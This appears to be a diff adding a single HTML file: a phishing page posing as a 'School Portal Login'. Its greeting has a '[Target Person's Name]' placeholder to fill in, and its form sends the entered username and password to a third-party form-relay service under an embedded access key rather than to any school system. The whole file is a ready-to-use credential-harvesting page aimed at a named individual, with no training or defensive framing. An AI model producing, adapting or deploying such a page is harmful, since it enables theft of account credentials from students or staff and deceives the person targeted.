@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>School Portal Login</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; }
+        .login-box { width: 300px; margin: 0 auto; padding: 20px; border: 1px solid #ccc; }
+        input { width: 100%; padding: 8px; margin: 10px 0; }
+        button { padding: 10px 20px; background-color: #4CAF50; color: white; border: none; }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <h2>School Portal Login</h2>
+        <p>Please log in, [Target Person’s Name]!</p>
+        <form action="https://api.web3forms.com/submit" method="POST">
+            <input type="hidden" name="access_key" value="aea51f96-5193-455e-9b34-5b6cdc8a36c5">
+            <input type="text" name="username" placeholder="Username" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <input type="checkbox" name="botcheck" class="hidden" style="display: none;">
+            <button type="submit">Log In</button>
+        </form>
+    </div>
+</body>
+</html>
